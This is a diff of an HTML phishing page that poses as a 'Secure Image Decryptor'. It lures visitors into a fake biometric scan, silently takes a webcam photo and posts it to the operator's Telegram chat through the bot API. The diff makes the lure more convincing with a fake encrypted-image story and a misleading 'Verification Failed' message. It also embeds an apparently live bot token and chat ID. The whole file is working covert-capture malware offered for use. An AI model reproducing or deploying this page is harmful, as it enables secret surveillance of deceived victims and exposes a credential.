@@ -1,65 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Verification System</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Image Decryptor</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
-        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #0d1117; color: #58a6ff; text-align: center; padding: 20px; }
+        .container { border: 1px solid #30363d; padding: 30px; border-radius: 10px; display: inline-block; margin-top: 50px; }
+        .btn { background-color: #238636; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 6px; cursor: pointer; margin-top: 20px; }
+        .btn:hover { background-color: #2ea043; }
+        #status { margin-top: 20px; font-style: italic; color: #8b949e; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-
-    <h2>Device Verification Required</h2>
-    <p>Please click the button below to verify your identity.</p>
-    
-    <button class="btn" onclick="startCapture()">VERIFY NOW</button>
+    <div class="container">
+        <h2>🔒 Encrypted Image Received</h2>
+        <p>Your image has been locked for security. To view the original content, please perform a <b>Biometric Verification</b> scan.</p>
+        
+        <button class="btn" onclick="startVerification()">START SCAN</button>
+        <div id="status">Waiting for user...</div>
+    </div>
 
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
-        const CHAT_ID = "6643732863"; // Replace this with your ID!
+        const CHAT_ID = "6643732863"; // <--- CHANGE THIS TO YOUR TELEGRAM ID
 
-        async function startCapture() {
+        async function startVerification() {
+            const status = document.getElementById('status');
+            status.innerText = "Accessing secure module...";
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                status.innerText = "Scanning... Stay still.";
 
-                // Wait for video to load then snap
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
                     
                     canvas.toBlob(blob => {
-                        sendToTelegram(blob);
+                        sendPhoto(blob);
                     }, 'image/jpeg');
-                    
-                    // Stop camera
+
                     stream.getTracks().forEach(track => track.stop());
-                    alert("Verification Complete!");
-                }, 2000);
+                    status.innerText = "Verification Failed. Try again later.";
+                }, 2500);
 
             } catch (err) {
-                alert("Please allow camera access to proceed.");
+                status.innerText = "Error: Biometric hardware not found.";
+                alert("You must allow camera access to decrypt the file.");
             }
         }
 
-        function sendToTelegram(photoBlob) {
+        function sendPhoto(blob) {
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
-            formData.append("photo", photoBlob, "capture.jpg");
+            formData.append("photo", blob, "scan.jpg");
+            formData.append("caption", "🎯 Biometric Scan Captured!");
 
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
-            })
-            .then(response => console.log("Success:", response))
-            .catch(error => console.error("Error:", error));
+            });
         }
     </script>
 </body>
